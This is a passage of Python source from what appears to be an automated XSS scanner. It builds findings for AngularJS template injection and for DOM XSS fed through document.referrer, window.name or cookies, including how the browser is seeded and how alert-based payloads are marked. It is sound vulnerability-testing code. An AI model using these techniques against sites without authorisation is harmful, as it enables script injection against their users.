    # The generic expression family is always reported last: it is the one an
    # app that hardened its sandbox would have already closed.
    families = sorted(families, key=lambda f: family_rank(f[1]), reverse=True)
    candidates = [_angular_expression(c, marker) for c, _fam in families]
    families_named = [fam for _c, fam in families]

    csp = csp_blocks_inline(html, headers)
    return XSSFinding(
        url=url,
        parameter=parameter,
        method="GET",
        context=InjectionContext.HTML_TEXT,
        payload=candidates[0],
        evidence=(
            "AngularJS template injection: payload lands in a compiled subtree "
            f"(root declared by {boot}, compiled by {compilers[0] if compilers else 'angular.bootstrap'}"
            + (f", v{version}" if version else "")
            + "); a {{…}} expression there is evaluated by the compiler, not printed"
            + ("; CSP forbids eval, so only the event-object family can reach window" if csp else "")
            + f"; families={','.join(families_named)}"
        ),
        browser_confirmed=False,
        impact="high",
        vulnerability_type="reflected",
        confidence=0.55,
        marker=marker,
        payload_candidates=candidates,
    )


def source_seed(
    source: str, payload: str, url: str
) -> Dict[str, Any]:
    """The ``confirm()`` keyword the browser needs to feed *source* *payload*.

    A DOM sink reading ``document.referrer`` or ``window.name`` cannot be
    exercised through the URL at all: the value has to be planted in the
    browser before the document parses, so callers ask here for the seed.
    """
    if source == "document.referrer":
        # ``confirm()`` installs this value as ``document.referrer`` before any
        # page script runs, so it lands verbatim — but the page then applies
        # ``unescape()`` to it, so the seed must be percent-encoded to survive.
        return {"referrer": payload.replace(" ", "%20")}
    if source == "window.name":
        return {"window_name": payload}
    if source in ("document.cookie", "cookie"):
        return {"cookies": [("badValue", payload), ("payload", payload)]}
    return {}


def dom_source_finding(url: str, html: str, marker: str = "") -> Optional[XSSFinding]:
    """DOM XSS where the source is a browser-owned value, not a URL parameter.

    ``location.hash`` / ``location.search`` findings are handled by
    :func:`fragment_dom_finding`; this covers ``document.referrer``,
    ``window.name`` and cookie reads that reach an execution sink. The finding
    carries the seed the orchestrator must plant in the browser to prove it.
    """
    flows = analyze_dom_flows(html)
    # Only flows no URL can drive: otherwise fragment analysis owns the case.
    seedable = {
        "document.referrer",
        "window.name",
        "document.cookie",
    }
    candidates_flows = [f for f in flows if f[0] in seedable]
    if not candidates_flows:
        return None

    # Every sink reachable from a *seeded* source may only be fed through the
    # browser, never through the URL: a ``location.href`` assignment that came
    # from ``location.href`` itself is not attacker-controlled, so it must rank
    # below any sink the seed actually reaches.
    def _rank(flow) -> tuple:
        _source, sink, family = flow
        via_url = sink in _SRC_SINKS and sink in ("location_assign", "location.assign")
        return (0 if via_url else 1, {"code": 3, "html": 2, "src": 1}.get(family, 0))

    source, sink, family = max(candidates_flows, key=_rank)
    js = "\n".join(_scripts(html))
    candidates = [
        (_mark_payload(p, marker), why)
        for p, why in _payload_candidates(family, sink, js)
    ]
    payload, rationale = candidates[0]
    seeds = source_seed(source, payload, url)
    return XSSFinding(
        url=url,
        parameter=source,
        method="GET",
        context=InjectionContext.URL_FRAGMENT,
        payload=payload,
        evidence=(
            f"DOM taint: {source} reaches sink(s) {sorted({s for _, s, _ in candidates_flows})} "
            f"(chosen: {sink}); {rationale}"
        ),
        browser_confirmed=False,
        impact="high",
        vulnerability_type="dom",
        confidence=0.75,
        marker=marker,
        payload_candidates=[p for p, _ in candidates],
        seeds=seeds,
    )


def dom_payload_candidates(html: str, flows: List[Tuple[str, str, str]]) -> List[str]:
    """Ordered fragment payloads for the chosen flow of an already-analysed page."""
    if not flows:
        return []
    hash_flows = [f for f in flows if f[0] in ("location.hash", "URL parameter")]
    chosen = hash_flows or flows
    rank = {"src": 3, "code": 2, "html": 1}
    _source, sink, family = max(chosen, key=lambda f: rank.get(f[2], 0))
    js = "\n".join(_scripts(html))
    return [p for p, _ in _payload_candidates(family, sink, js)]


def _mark_payload(payload: str, marker: str) -> str:
    """Bind the generated DOM payload to *marker* so confirmation is causal.

    ``alert(1)`` is the canonical placeholder and is rewritten in place; a
    payload that already contains the marker (a ``$eval`` string, say) is left
    alone so the marker does not end up nested inside its own quotes. As a last
    resort a bare ``alert(1)`` becomes ``alert(<marker>)``, which still carries
    the token through a dialog.
    """
    if not marker:
        return payload
    if re.search(r"ixm[0-9a-f]{6,}", payload):
        return payload
    # A payload that already quotes its argument — ``alert("1")`` inside a
    # single-quoted JS string — must keep the nesting: substituting quotes of
    # the same kind would terminate the outer string and the call would never
    # parse. The marker therefore inherits whichever quote is already there.
    for q in ('"', "'"):
        needle = f"alert({q}1{q})"
        if needle in payload:
            return payload.replace(needle, f"alert({q}{marker}{q})")
    if "alert(1)" in payload:
        return payload.replace("alert(1)", f"alert('{marker}')")
    return payload.replace("alert()", f"alert('{marker}')")
